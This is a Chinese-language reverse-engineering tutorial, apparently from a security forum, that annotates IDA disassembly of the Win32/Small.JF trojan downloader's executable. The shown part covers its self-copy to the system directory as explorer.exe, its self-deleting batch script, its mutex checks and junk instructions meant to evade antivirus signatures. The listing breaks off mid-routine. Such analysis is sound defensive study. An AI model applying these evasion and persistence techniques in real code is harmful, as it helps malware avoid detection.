
# Win32Small.JF 木马 exe 部分完全解析

> 原文：[`www.pediy.com/kssd/pediy10/74512.html`](https://www.pediy.com/kssd/pediy10/74512.html)

![](img/c72cb8eba397ac67dda6e1ac58a9b627.jpg "微笑") 我分析的一个 Downloader，TrojanDownloader:Win32/Small.JF（MICROSOFT），

由于时间精力有限，只整理了 exe 部分的分析，为了方便读者阅读，

我加了大量的 注释，相信已经足够多，但仍希望读者具有一定的汇编基础，

逆向分析能力和 API 编程经验。

让我们开始吧：

```assembly
PS_:00403896 ;=============== S U B R O U T I N E =======================================

PS_:00403896

PS_:00403896 ; Attributes: bp-based frame

PS_:00403896

PS_:00403896              public start
PS_:00403896 start         proc near

PS_:00403896 FileName_41C    = byte ptr -41Ch
PS_:00403896 var_41B         = byte ptr -41Bh
PS_:00403896 ExistingFileName_318= byte ptr -318h
PS_:00403896 var_317         = byte ptr -317h
PS_:00403896 NewFileName_214 = byte ptr -214h
PS_:00403896 var_213         = byte ptr -213h
PS_:00403896 Buffer_110      = byte ptr -110h
PS_:00403896 var_10F         = byte ptr -10Fh
PS_:00403896 var_C           = dword ptr -0Ch
PS_:00403896 var_8           = dword ptr -8
PS_:00403896 NumberOfBytesWritten_4= dword ptr -4

PS_:00403896              push    ebp
PS_:00403897              mov     ebp, esp
PS_:00403899              sub     esp, 41Ch
PS_:0040389F              push    ebx
PS_:004038A0              push    esi
PS_:004038A1              push    edi
PS_:004038A2              push    40h
PS_:004038A4              pop     edx             ; edx==40
PS_:004038A5              xor     ebx, ebx        ; ebx==0
PS_:004038A7              mov     ecx, edx        ; 40
PS_:004038A9              xor     eax, eax        ; eax==0
PS_:004038AB              lea     edi, [ebp+var_213] ; 213-103==110   ;;Local variable.
PS_:004038B1              mov     [ebp+NewFileName_214], bl ; bl==0
PS_:004038B7              rep stosd
PS_:004038B9              stosw
PS_:004038BB              stosb                   ; count of initialized bytes is 103
PS_:004038BC              mov     ecx, edx        ; 40
PS_:004038BE              xor     eax, eax        ; eax==0
PS_:004038C0              lea     edi, [ebp+var_41B] ; 41B-103=318
PS_:004038C6              mov     [ebp+FileName_41C], bl ; bl==0
PS_:004038CC              rep stosd
PS_:004038CE              stosw
PS_:004038D0              stosb                   ; Count of initialized bytes is 103
PS_:004038D1              mov     ecx, edx        ; 40
PS_:004038D3              xor     eax, eax        ; eax==0
PS_:004038D5              lea     edi, [ebp+var_10F] ; 10F-103==C
PS_:004038DB              mov     [ebp+Buffer_110], bl ; bl==0
PS_:004038E1              rep stosd
PS_:004038E3              stosw
PS_:004038E5              stosb                   ; 103 bytes initialized
PS_:004038E6              mov     ecx, edx        ; 40
PS_:004038E8              xor     eax, eax        ; eax==0
PS_:004038EA              lea     edi, [ebp+var_317] ; 317-103=214
PS_:004038F0              mov     [ebp+ExistingFileName_318], bl ; bl==0
PS_:004038F6              rep stosd
PS_:004038F8              stosw
PS_:004038FA              stosb                   ; 103 byets initialized
```

以上是局部变量的初始化过程，相信参考我的注释读者应该可以容易看懂。

如果读者对某一指令不太熟悉，可以到 [www.intel.com](http://www.intel.com) 下载相关文档。

```assembly
PS_:004038FB              mov     edi, 104h       ; length of char array
PS_:00403900              lea     eax, [ebp+Buffer_110] ; system directory
PS_:00403906              push    edi             ; uSize
PS_:00403907              push    eax             ; lpBuffer
PS_:00403908              mov     [ebp+NumberOfBytesWritten_4], ebx ; Initialize local variable with 0
PS_:0040390B              call    GetSystemDirectoryA  ；；获取系统目录
PS_:00403911              mov     esi, wsprintfA      ；；API 地址
PS_:00403917              lea     eax, [ebp+Buffer_110] ; system directory
PS_:0040391D              push    eax
PS_:0040391E              lea     eax, [ebp+NewFileName_214]   ；；system directory\\explorer.exe
PS_:00403924              push    offset aSExplorer_exe       ; "%s\\explorer.exe"
PS_:00403929              push    eax                   ; LPSTR
PS_:0040392A              call    esi ; wsprintfA
PS_:0040392C              lea     eax, [ebp+Buffer_110]     ; system directory
PS_:00403932              push    eax
PS_:00403933              lea     eax, [ebp+FileName_41C]     ; system directory\\netsrv.dll
PS_:00403939              push    offset aSNetsrv_dll   ; "%s\\netsrv.dll"
PS_:0040393E              push    eax             ; LPSTR
PS_:0040393F              call    esi ; wsprintfA   ; Notice the difference among the different calling conventions.
PS_:00403941              add     esp, 18h        ; Revert the stack pointer  2*C
PS_:00403944              lea     eax, [ebp+ExistingFileName_318]
PS_:0040394A              push    edi             ; nSize
PS_:0040394B              push    eax             ; lpFilename
PS_:0040394C              push    ebx             ; hModule  ebx==0
PS_:0040394D              call    GetModuleFileNameA   ; Retrieve full path and file name of the executable file
PS_:00403953              pusha                   ; useless
PS_:00403954              mov     eax, 3
PS_:00403959              popa                    ; useless
```

在此处读者需要注意：以上代码片段从实现程序功能的角度讲没有任何实际作用，但他们有时会被

恶意程序的设计者们用来躲过安全软件的特征码扫描，举个最简单的例子：

假设有一个世界公认的恶性病毒，安全厂商的技术人员会尝试从他们的得到的样本中提取特征码，

然后将从文件中读出的信息与特征码进行匹配，一旦相同，。。。。。。

之所以称为特征码，是因为它们应当十分罕见（在病毒体之外），或者说病毒特有，这样它们就可以作为识别病毒的特征。

```assembly
假设 mov eax, 0
     inc eax
对应的机器码被作为特征码，那么

mov eax, 0
pusha
mov eax, 3
popa
inc eax
对应的机器码就不会被安全软件识别，当然，现在的技术有了很大的提高，我不能保证此法绝对有效。但你完全可以相信 特征码 扫描是杀毒软件识别
恶意程序的基本法方法，病毒不断涌现，特征码不断增加，这就是你的杀软的 病毒库需要更新的根本原因。

PS_:0040395A              lea     eax, [ebp+ExistingFileName_318] ; Module file name
PS_:00403960              push    offset aExplorer_exe ; "explorer.exe"
PS_:00403965              push    eax             ; lpsz
PS_:00403966              call    CharLowerA
PS_:0040396C              push    eax             ; a pointer to module file name
PS_:0040396D              call    CompareStrings  ; if string1 contains string2 ,return non-zero.Otherwise return 0
```

以下是 `CompareStrings` 函数：

```assembly
PS_:00403844 ;=============== S U B R O U T I N E =======================================

PS_:00403844

PS_:00403844 ; Attributes: bp-based frame

PS_:00403844
CompareStrings  proc near           ; CODE XREF: start+D7 p
```



PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 `arg\_0` = `dword` `ptr` 8  
PS\_\_\_\_\_\_:00403844 `arg\_4` = `dword` `ptr` 0Ch  

PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 `push` `ebp`  
PS\_\_\_\_\_\_:00403845 `mov` `ebp`, `esp`  
PS\_\_\_\_\_\_:00403847 `push` `ebx`  
PS\_\_\_\_\_\_:00403848 `push` `esi`  
PS\_\_\_\_\_\_:00403849 `mov` `esi`, `[ebp+arg\_0]` ; `p1`  
PS\_\_\_\_\_\_:0040384C `push` `edi`  
PS\_\_\_\_\_\_:0040384D `xor` `edi`, `edi` ; `edi==0`  
PS\_\_\_\_\_\_:0040384F `mov` `cl`, `[esi]`  
PS\_\_\_\_\_\_:00403851 `test` `cl`, `cl`  
PS\_\_\_\_\_\_:00403853 `jz` `short` `loc\_40388A` ; If the first parameter is invalid, failed, return 0  
PS\_\_\_\_\_\_:00403855 `mov` `ebx`, `[ebp+arg\_4]` ; Get the second parameter  
PS\_\_\_\_\_\_:00403858 `mov` `eax`, `esi` ; `p1`  
PS\_\_\_\_\_\_:0040385A `mov` `dl`, `[ebx]` ; The first character of second string  
PS\_\_\_\_\_\_:0040385C `mov` `byte` `ptr` `[ebp+arg\_0+3]`, `dl` ; This instruction will modify the stack parameter  

PS\_\_\_\_\_\_:0040385F  
PS\_\_\_\_\_\_:0040385F `loc\_40385F:` ; `CODE` `XREF:` `CompareStrings+44` `j`  
PS\_\_\_\_\_\_:0040385F `cmp` `cl`, `byte` `ptr` `[ebp+arg\_0+3]` ; Compare the first character with another  
PS\_\_\_\_\_\_:00403862 `jnz` `short` `loc\_40387F`  
PS\_\_\_\_\_\_:00403864 `push` 1  
PS\_\_\_\_\_\_:00403866 `mov` `ecx`, `ebx` ; `p2`  
PS\_\_\_\_\_\_:00403868 `mov` `[ebp+arg\_4]`, `eax` ; `p1`  
PS\_\_\_\_\_\_:0040386B `pop` `edx` ; `edx==1`  

PS\_\_\_\_\_\_:0040386C  
PS\_\_\_\_\_\_:0040386C `loc\_40386C:` ; `CODE` `XREF:` `CompareStrings+39` `j`  
PS\_\_\_\_\_\_:0040386C `cmp` `byte` `ptr` `[edx+ecx]`, 0 ; If we encounter the termination of the second string,  
PS\_\_\_\_\_\_:0040386C ; it proves that the second string is contained  
PS\_\_\_\_\_\_:0040386C ; in the first string.  
PS\_\_\_\_\_\_:00403870 `jz` `short` `loc\_403891`  
PS\_\_\_\_\_\_:00403872 `inc` `[ebp+arg\_4]` ; increase the string pointer  
PS\_\_\_\_\_\_:00403875 `inc` `ecx` ; Increase the string pointer  
PS\_\_\_\_\_\_:00403876 `mov` `eax`, `[ebp+arg\_4]` ; `p1`  
PS\_\_\_\_\_\_:00403879 `mov` `al`, `[eax]`  
PS\_\_\_\_\_\_:0040387B `cmp` `al`, `[ecx]` ; `p2`  
PS\_\_\_\_\_\_:0040387D `jz` `short` `loc\_40386C`  

PS\_\_\_\_\_\_:0040387F  
PS\_\_\_\_\_\_:0040387F `loc\_40387F:` ; `CODE` `XREF:` `CompareStrings+1E` `j`  
PS\_\_\_\_\_\_:0040387F `inc` `edi`  
PS\_\_\_\_\_\_:00403880 `mov` `cl`, `[edi+esi]` ; Get the next character of `p1`  
PS\_\_\_\_\_\_:00403883 `lea` `eax`, `[edi+esi]`  
PS\_\_\_\_\_\_:00403886 `test` `cl`, `cl`  
PS\_\_\_\_\_\_:00403888 `jnz` `short` `loc\_40385F`  

PS\_\_\_\_\_\_:0040388A  
PS\_\_\_\_\_\_:0040388A `loc\_40388A:` ; `CODE` `XREF:` `CompareStrings+F` `j`  
PS\_\_\_\_\_\_:0040388A `xor` `eax`, `eax`  

PS\_\_\_\_\_\_:0040388C  
PS\_\_\_\_\_\_:0040388C `loc\_40388C:` ; `CODE` `XREF:` `CompareStrings+50` `j`  
PS\_\_\_\_\_\_:0040388C `pop` `edi`  
PS\_\_\_\_\_\_:0040388D `pop` `esi`  
PS\_\_\_\_\_\_:0040388E `pop` `ebx`  
PS\_\_\_\_\_\_:0040388F `pop` `ebp`  
PS\_\_\_\_\_\_:00403890 `retn`  

PS\_\_\_\_\_\_:00403891 ; ---------------------------------------------------------------------------  
PS\_\_\_\_\_\_:00403891  
PS\_\_\_\_\_\_:00403891 `loc\_403891:` ; `CODE` `XREF:` `CompareStrings+2C` `j`  
PS\_\_\_\_\_\_:00403891 `lea` `eax`, `[edi+esi]` ; pointer  
PS\_\_\_\_\_\_:00403894 `jmp` `short` `loc\_40388C`  
PS\_\_\_\_\_\_:00403894 `CompareStrings` `endp`  
PS\_\_\_\_\_\_:00403894  
PS\_\_\_\_\_\_:00403896  

虽然我加了注释，由于此函数可读性较差，读者理解起来可能仍有困难，所以我用 `C` 语言的语法形式对其结构进行了划分：

PS\_\_\_\_\_\_:00403844 ; ================ S U B R O U T I N E =======================================  
PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 ; Attributes: bp-based frame  
PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 `CompareStrings` `proc` `near` ; `CODE` `XREF:` `start+D7` `p`  
PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 `arg\_0` = `dword` `ptr` 8  
PS\_\_\_\_\_\_:00403844 `arg\_4` = `dword` `ptr` 0Ch  
PS\_\_\_\_\_\_:00403844  
PS\_\_\_\_\_\_:00403844 `push` `ebp`  
PS\_\_\_\_\_\_:00403845 `mov` `ebp`, `esp`  
PS\_\_\_\_\_\_:00403847 `push` `ebx`  
PS\_\_\_\_\_\_:00403848 `push` `esi`  
PS\_\_\_\_\_\_:00403849 `mov` `esi`, `[ebp+arg\_0]` ; `p1`  
PS\_\_\_\_\_\_:0040384C `push` `edi`  
PS\_\_\_\_\_\_:0040384D `xor` `edi`, `edi` ; `edi==0`  
PS\_\_\_\_\_\_:0040384F `mov` `cl`, `[esi]`  
PS\_\_\_\_\_\_:00403851 `test` `cl`, `cl`  
PS\_\_\_\_\_\_:00403853 `jz` `short` `loc\_40388A` ; If the first parameter is invalid, failed, return 0  

```
if 001 start   if(cl!=0)
```

PS\_\_\_\_\_\_:00403855 `mov` `ebx`, `[ebp+arg\_4]` ; Get the second parameter  
PS\_\_\_\_\_\_:00403858 `mov` `eax`, `esi` ; `p1`  
PS\_\_\_\_\_\_:0040385A `mov` `dl`, `[ebx]` ; The first character of second string  
PS\_\_\_\_\_\_:0040385C `mov` `byte` `ptr` `[ebp+arg\_0+3]`, `dl` ; This instruction will modify the stack parameter  

`Loop` `001` `start`

PS\_\_\_\_\_\_:0040385F  
PS\_\_\_\_\_\_:0040385F `loc\_40385F:` ; `CODE` `XREF:` `CompareStrings+44` `j`  
PS\_\_\_\_\_\_:0040385F `cmp` `cl`, `byte` `ptr` `[ebp+arg\_0+3]` ; Compare the first characters of two strings  
PS\_\_\_\_\_\_:00403862 `jnz` `short` `loc\_40387F`  

`if` `002` `start`

PS\_\_\_\_\_\_:00403864 `push` 1  
PS\_\_\_\_\_\_:00403866 `mov` `ecx`, `ebx` ; `p2`  
PS\_\_\_\_\_\_:00403868 `mov` `[ebp+arg\_4]`, `eax` ; `p1`  
PS\_\_\_\_\_\_:0040386B `pop` `edx` ; `edx==1`  

`Loop` `002` `start`

PS\_\_\_\_\_\_:0040386C  
PS\_\_\_\_\_\_:0040386C `loc\_40386C:` ; `CODE` `XREF:` `CompareStrings+39` `j`  
PS\_\_\_\_\_\_:0040386C `cmp` `byte` `ptr` `[edx+ecx]`, 0 ; If we encounter the termination of the second string,  
PS\_\_\_\_\_\_:0040386C ; it proves that the second string is contained  
PS\_\_\_\_\_\_:0040386C ; in the first string.  
PS\_\_\_\_\_\_:00403870 `jz` `short` `loc\_403891`  
PS\_\_\_\_\_\_:00403872 `inc` `[ebp+arg\_4]` ; increase the string pointer  
PS\_\_\_\_\_\_:00403875 `inc` `ecx` ; Increase the string pointer  
PS\_\_\_\_\_\_:00403876 `mov` `eax`, `[ebp+arg\_4]` ; `p1`  
PS\_\_\_\_\_\_:00403879 `mov` `al`, `[eax]`  
PS\_\_\_\_\_\_:0040387B `cmp` `al`, `[ecx]` ; `p2`  
PS\_\_\_\_\_\_:0040387D `jz` `short` `loc\_40386C`  

`Loop` `002` `end`

`If` `002` `end`

PS\_\_\_\_\_\_:0040387F  
PS\_\_\_\_\_\_:0040387F `loc\_40387F:` ; `CODE` `XREF:` `CompareStrings+1E` `j`  
PS\_\_\_\_\_\_:0040387F `inc` `edi`



```
PS_____:00403880                 mov     cl, [edi+esi]   ; Get the next character of p1  

PS_____:00403883                 lea     eax, [edi+esi]  

PS_____:00403886                 test    cl, cl  

PS_____:00403888                 jnz     short loc_40385F  

Loop 001 end  

if 001 end  

PS_____:0040388A  

PS_____:0040388A loc_40388A:                      ; CODE XREF: CompareStrings+F j  

PS_____:0040388A                 xor     eax, eax  

PS_____:0040388C  

PS_____:0040388C loc_40388C:                      ; CODE XREF: CompareStrings+50 j  

PS_____:0040388C                 pop     edi  

PS_____:0040388D                 pop     esi  

PS_____:0040388E                 pop     ebx  

PS_____:0040388F                 pop     ebp  

PS_____:00403890                 retn  

PS_____:00403891 ; ---------------------------------------------------------------------------  

PS_____:00403891  

PS_____:00403891 loc_403891:                      ; CODE XREF: CompareStrings+2C j  

PS_____:00403891                 lea     eax, [edi+esi]  ; pointer  

PS_____:00403894                 jmp     short loc_40388C  

PS_____:00403894 CompareStrings  endp  

PS_____:00403894  

PS_____:00403896  
```

其中，`Loop` 对应于 C 中的循环结构，`if` 对应 C 中 `if(){}` 结构体。相信结构上的划分可以帮助读者理解。

我们继续：

```
PS_____:00403972                 pop     ecx             ; Revert sp  

PS_____:00403973                 test    eax, eax        ；notice  

PS_____:00403975                 pop     ecx             ; Revert sp  

PS_____:00403976                 jnz     short loc_4039E0    ；；又一个 if(){}  

PS_____:00403978                 lea     eax, [ebp+NewFileName_214]  

PS_____:0040397E                 push    1               ; bFailIfExists  

PS_____:00403980                 push    eax             ; lpNewFileName  

PS_____:00403981                 lea     eax, [ebp+ExistingFileName_318]  

PS_____:00403987                 push    eax             ; lpExistingFileName  

PS_____:00403988                 call    CopyFileA       ; copy itself to system directory  
```

将自己拷贝到系统目录下，然后创建新进程，并结束当前进程。

```
PS_____:0040398E                 mov     esi, GlobalAlloc  

PS_____:00403994                 push    44h             ; dwBytes  

PS_____:00403996                 push    40h             ; uFlags  

PS_____:00403998                 call    esi ; GlobalAlloc  

PS_____:0040399A                 push    10h             ; dwBytes  

PS_____:0040399C                 push    40h             ; uFlags  

PS_____:0040399E                 mov     edi, eax        ; Pointer to the heap memory  

PS_____:004039A0                 call    esi ; GlobalAlloc  

PS_____:004039A2                 push    eax             ; lpProcessInformation  

PS_____:004039A3                 xor     esi, esi        ; esi==0  

PS_____:004039A5                 push    edi             ; lpStartupInfo  

PS_____:004039A6                 push    esi             ; lpCurrentDirectory  

PS_____:004039A7                 push    esi             ; lpEnvironment  

PS_____:004039A8                 push    esi             ; dwCreationFlags  

PS_____:004039A9                 push    esi             ; bInheritHandles  

PS_____:004039AA                 push    esi             ; lpThreadAttributes  

PS_____:004039AB                 push    esi             ; lpProcessAttributes  

PS_____:004039AC                 lea     eax, [ebp+NewFileName_214] ; newly created exe file  

PS_____:004039B2                 push    esi             ; lpCommandLine  

PS_____:004039B3                 push    eax             ; lpApplicationName  

PS_____:004039B4                 mov     dword ptr [edi], 4 ; Initialize heap with 4  

PS_____:004039BA                 call    CreateProcessA  ; Another process  

PS_____:004039C0                 push    3E8h            ; dwMilliseconds  

PS_____:004039C5                 call    Sleep           ; Wait...  

PS_____:004039CB                 call    DeletePreviousEXEFile  
```

这是一个有趣的函数，对它进行详细的分析很有必要：

```
PS_____:00403C1F ; =============== S U B R O U T I N E =========================================  

PS_____:00403C1F  

PS_____:00403C1F ; Attributes: bp-based frame  

PS_____:00403C1F  

PS_____:00403C1F DeletePreviousEXEFile proc near         ; CODE XREF: start+135 p  

PS_____:00403C1F  

PS_____:00403C1F String_550      = byte ptr -550h  

PS_____:00403C1F var_54F         = byte ptr -54Fh  

PS_____:00403C1F Str_350         = byte ptr -350h  

PS_____:00403C1F var_34F         = byte ptr -34Fh  

PS_____:00403C1F Filename_24C    = byte ptr -24Ch  

PS_____:00403C1F var_24B         = byte ptr -24Bh  

PS_____:00403C1F FileName_148    = byte ptr -148h  

PS_____:00403C1F var_147         = byte ptr -147h  

PS_____:00403C1F var_44          = byte ptr -44h  

PS_____:00403C1F String2_14      = byte ptr -14h  

PS_____:00403C1F NumberOfBytesWritten= dword ptr -4  

PS_____:00403C1F  

PS_____:00403C1F                 push    ebp  

PS_____:00403C20                 mov     ebp, esp  

PS_____:00403C22                 sub     esp, 550h  

PS_____:00403C28                 push    ebx  

PS_____:00403C29                 push    esi  

PS_____:00403C2A                 push    edi  

PS_____:00403C2B                 push    0Bh  

PS_____:00403C2D                 pop     ecx             ; 0BH  

PS_____:00403C2E                 mov     esi, offset aRepeatDelSIfEx ; ":Repeat\r\ndel \"%s\"\r\nif exist \"%s\" goto R"...  
```

关于 `aRepeatDelSIfEx` 的定义：

```
PS_____:00403814 aRepeatDelSIfEx db ':Repeat',0Dh,0Ah    ; DATA XREF: DeletePreviousEXEFile+F o  

PS_____:00403814                 db 'del "%s"',0Dh,0Ah  

PS_____:00403814                 db 'if exist "%s" goto Repeat',0Dh,0Ah,0  
```

我们继续：

```
PS_____:00403C33                 lea     edi, [ebp+var_44]   ; :Repeat...  

PS_____:00403C36                 push    7Fh  

PS_____:00403C38                 rep movsd  

PS_____:00403C3A                 movsw  

PS_____:00403C3C                 movsb                     ; 2BH bytes was moved  

PS_____:00403C3D                 mov     esi, offset a_uninsep_bat   ; "_uninsep.bat"  

PS_____:00403C42                 lea     edi, [ebp+String2_14]     ; File name "_uninsep.bat"  

PS_____:00403C45                 movsd                 ; Move doubleword at address ds:(e)si to address es:(e)di  

PS_____:00403C46                 movsd  

PS_____:00403C47                 movsd  

PS_____:00403C48                 movsb                 ; 13 bytes were moved  

PS_____:00403C49                 xor     ebx, ebx        ; ebx==0  

PS_____:00403C4B                 pop     ecx             ; ecx==7F  

PS_____:00403C4C                 xor     eax, eax        ; eax==0  

PS_____:00403C4E                 lea     edi, [ebp+var_54F]  

PS_____:00403C54                 mov     [ebp+String_550], bl ; bl==0  

PS_____:00403C5A                 push    40h  

PS_____:00403C5C                 rep stosd               ; Initialize with 0  

PS_____:00403C5E                 stosw  

PS_____:00403C60                 stosb                 ; 1FF bytes was initialized with 0  

PS_____:00403C61                 pop     ecx             ; 40  
```



```
PS_____:00403C62                 xor     eax, eax        ; 0  

PS_____:00403C64                 lea     edi, [ebp+var_24B]  

PS_____:00403C6A                 mov     [ebp+Filename_24C], bl  

PS_____:00403C70                 rep stosd  

PS_____:00403C72                 stosw  

PS_____:00403C74                 stosb                   ; 103 byets was initialized with 0  

PS_____:00403C75                 push    40h  

PS_____:00403C77                 xor     eax, eax  

PS_____:00403C79                 pop     ecx             ; 40  

PS_____:00403C7A                 lea     edi, [ebp+var_147]  

PS_____:00403C80                 mov     [ebp+FileName_148], bl  

PS_____:00403C86                 push    40h  

PS_____:00403C88                 rep stosd  

PS_____:00403C8A                 stosw  

PS_____:00403C8C                 stosb                   ; 103 bytes was initialized with 0  

PS_____:00403C8D                 pop     ecx             ; 40  

PS_____:00403C8E                 xor     eax, eax  

PS_____:00403C90                 lea     edi, [ebp+var_34F]  

PS_____:00403C96                 mov     [ebp+Str_350], bl  

PS_____:00403C9C                 rep stosd  

PS_____:00403C9E                 stosw  

PS_____:00403CA0                 stosb                   ; 103  

PS_____:00403CA1                 lea     eax, [ebp+String2_14] ; file name "_uninset.bat"  

PS_____:00403CA4                 mov     [ebp+NumberOfBytesWritten], ebx ; Initialze local variable with 0  

PS_____:00403CA7                 push    eax             ; lpString2  

PS_____:00403CA8                 lea     eax, [ebp+FileName_148] ; _uninset.bat  

PS_____:00403CAE                 push    eax             ; lpString1  

PS_____:00403CAF                 call    lstrcatA        ; Create file name "_uninset.bat"  

PS_____:00403CB5                 lea     eax, [ebp+String2_14]  

PS_____:00403CB8                 push    eax  

PS_____:00403CB9                 lea     eax, [ebp+FileName_148] ; c:\_uninset.bat  

PS_____:00403CBF                 push    offset aCS      ; "c:\\%s"  

PS_____:00403CC4                 push    eax             ; LPSTR  

PS_____:00403CC5                 call    wsprintfA       ; Create "c:\_uninset.bat"  

PS_____:00403CCB                 add     esp, 0Ch        ; Revert sp  ;;Caution  

PS_____:00403CCE                 lea     eax, [ebp+Filename_24C] ; full path and module name  

PS_____:00403CD4                 push    104h            ; nSize  

PS_____:00403CD9                 push    eax             ; lpFilename  

PS_____:00403CDA                 push    ebx             ; hModule  

PS_____:00403CDB                 call    GetModuleFileNameA  

PS_____:00403CE1                 lea     eax, [ebp+Filename_24C] ; module name  

PS_____:00403CE7                 push    eax             ; lpString2  

PS_____:00403CE8                 lea     eax, [ebp+Str_350]  

PS_____:00403CEE                 push    eax             ; lpString1  

PS_____:00403CEF                 call    lstrcpyA  

PS_____:00403CF5                 lea     eax, [ebp+Str_350] ; module name  

PS_____:00403CFB                 push    5Ch             ; Ch    Slash  '\'  

PS_____:00403CFD                 push    eax             ; Str  

PS_____:00403CFE                 call    strrchr  

PS_____:00403D04                 pop     ecx  

PS_____:00403D05                 cmp     eax, ebx        ; ebx==0  ;;eax is the return value of the strrchr()  

PS_____:00403D07                 pop     ecx  

PS_____:00403D08                 jz      loc_403DAB      ; if there is not a slash in the module name ,failed,return  

PS_____:00403D0E                 mov     [eax], bl       ; create new string  

PS_____:00403D10                 pusha                   ; useless  

PS_____:00403D11                 mov     eax, 1  

PS_____:00403D16                 popa                    ; useless  

PS_____:00403D17                 xor     edi, edi        ; edi==0  

PS_____:00403D19                 lea     eax, [ebp+FileName_148]  

PS_____:00403D1F                 push    edi             ; hTemplateFile  

PS_____:00403D20                 push    80h             ; dwFlagsAndAttributes  

PS_____:00403D25                 push    2               ; dwCreationDisposition  

PS_____:00403D27                 push    edi             ; lpSecurityAttributes  

PS_____:00403D28                 push    edi             ; dwShareMode  

PS_____:00403D29                 push    40000000h       ; dwDesiredAccess  

PS_____:00403D2E                 push    eax             ; lpFileName  

PS_____:00403D2F                 call    CreateFileA     ; c:\_uninset.bat
```

生成`c:\_uninset.bat`。下面将`:Repeat:….`写入此文件。并通`WinExec()`两次执行它。确保删除原始的可执行文件。

```
PS_____:00403D35                 mov     esi, eax        ; file handle  

PS_____:00403D37                 cmp     esi, 0FFFFFFFFh  

PS_____:00403D3A                 jz      short loc_403DAB ; if handle is invalid,failed  

PS_____:00403D3C                 lea     eax, [ebp+Filename_24C] ; module name  

PS_____:00403D42                 push    eax  

PS_____:00403D43                 lea     eax, [ebp+Filename_24C] ; module name  

PS_____:00403D49                 push    eax  

PS_____:00403D4A                 lea     eax, [ebp+var_44] ; :Repeat...  

PS_____:00403D4D                 push    eax             ; LPCSTR  

PS_____:00403D4E                 lea     eax, [ebp+String_550] ; file content  

PS_____:00403D54                 push    eax             ; LPSTR  

PS_____:00403D55                 call    wsprintfA       ; Create the file content  

PS_____:00403D5B                 add     esp, 10h        ; Revert the sp  

PS_____:00403D5E                 lea     eax, [ebp+NumberOfBytesWritten]  

PS_____:00403D61                 push    edi             ; lpOverlapped  

PS_____:00403D62                 push    eax             ; lpNumberOfBytesWritten  

PS_____:00403D63                 lea     eax, [ebp+String_550] ; file content  

PS_____:00403D69                 push    eax             ; lpString  

PS_____:00403D6A                 call    lstrlenA  

PS_____:00403D70                 push    eax             ; nNumberOfBytesToWrite  

PS_____:00403D71                 lea     eax, [ebp+String_550] ; file content  

PS_____:00403D77                 push    eax             ; lpBuffer  

PS_____:00403D78                 push    esi             ; hFile  

PS_____:00403D79                 call    WriteFile  

PS_____:00403D7F                 push    esi             ; hObject  

PS_____:00403D80                 call    CloseHandle     ; Close the file handle  

PS_____:00403D86                 mov     esi, WinExec  

PS_____:00403D8C                 lea     eax, [ebp+FileName_148]  

PS_____:00403D92                 push    edi             ; uCmdShow  

PS_____:00403D93                 push    eax             ; lpCmdLine  

PS_____:00403D94                 call    esi ; WinExec   ; execute newly created .bat file  

PS_____:00403D96                 push    12Ch            ; dwMilliseconds  

PS_____:00403D9B                 call    Sleep
```



```asm
PS_____:00403DA1             lea     eax, [ebp+FileName_148]  
PS_____:00403DA7             push    edi                 ; uCmdShow  
PS_____:00403DA8             push    eax                 ; lpCmdLine  
PS_____:00403DA9             call    esi ; WinExec   ; again  
PS_____:00403DAB  
PS_____:00403DAB loc_403DAB:                           ; CODE XREF: DeletePreviousEXEFile+E9 j  
PS_____:00403DAB                                               ; DeletePreviousEXEFile+11B j  
PS_____:00403DAB             pop     edi  
PS_____:00403DAC             pop     esi  
PS_____:00403DAD             pop     ebx  
PS_____:00403DAE             leave  
PS_____:00403DAF             retn  
PS_____:00403DAF DeletePreviousEXEFile endp  
```

`DeletePreviousEXEFile()`到此结束。继续：

```asm
PS_____:004039D0             push    esi                 ; uExitCode  
PS_____:004039D1             call    GetCurrentProcess  
PS_____:004039D7             push    eax                 ; hProcess  
PS_____:004039D8             call    TerminateProcess ; Terminate the current process  
PS_____:004039DE             jmp     short loc_4039E2 ; useless，will never be executed.  
PS_____:004039E0 ; ---------------------------------------------------------------------------  
PS_____:004039E0  
PS_____:004039E0 loc_4039E0:                           ; CODE XREF: start+E0 j  
PS_____:004039E0             xor     esi, esi  
PS_____:004039E2  
PS_____:004039E2 loc_4039E2:                           ; CODE XREF: start+148 j  
PS_____:004039E2             mov     edi, OpenMutexA  
PS_____:004039E8             push    offset Name       ; "CNXZ_PRO_2008"  
PS_____:004039ED             mov     ebx, 1F0001h  
PS_____:004039F2             push    esi                 ; bInheritHandle  
PS_____:004039F3             push    ebx                 ; dwDesiredAccess  
PS_____:004039F4             call    edi ; OpenMutexA  
PS_____:004039F6             test    eax, eax          ; CHECK HANDLE  
PS_____:004039F8             jnz     loc_403ADA         ; If already exists,jump  
PS_____:004039FE             push    offset a200823    ; "2008-2-3"  
PS_____:00403A03             push    esi                 ; bInheritHandle  
PS_____:00403A04             push    ebx                 ; dwDesiredAccess  
PS_____:00403A05             call    edi ; OpenMutexA  
PS_____:00403A07             test    eax, eax  
PS_____:00403A09             jnz     loc_403ADA         ; if already exists,jump  
```

以上代码段检测系统中是否存在指定的 `Mutex` 对象，如果存在，退出

```asm
PS_____:00403A0F             push    offset a200823    ; "2008-2-3"  
PS_____:00403A14             push    esi                 ; bInitialOwner  
PS_____:00403A15             push    esi                 ; lpMutexAttributes  
PS_____:00403A16             call    CreateMutexA      ; To prevent itself from        防止程序重复执行  
PS_____:00403A16                                             ; executing the same code  
PS_____:00403A16                                             ;   fragment  
PS_____:00403A1C             call    GetLastError  
PS_____:00403A22             cmp     eax, 563h         ; if already exist,jump  
PS_____:00403A27             jz      loc_403ADA         ; If failed,jump  
PS_____:00403A2D             pusha                    ; useless  
PS_____:00403A2E             mov     eax, 3  
PS_____:00403A33             popa                     ; over  
PS_____:00403A34             xor     ebx, ebx          ; ebx==0  
PS_____:00403A36             lea     eax, [ebp+FileName_41C]  
PS_____:00403A3C             push    ebx                 ; hTemplateFile  
PS_____:00403A3D             push    80h                 ; dwFlagsAndAttributes  
PS_____:00403A42             push    2                   ; dwCreationDisposition  
PS_____:00403A44             push    ebx                 ; lpSecurityAttributes  
PS_____:00403A45             push    ebx                 ; dwShareMode  
PS_____:00403A46             push    40000000h           ; dwDesiredAccess  
PS_____:00403A4B             push    eax                 ; lpFileName  
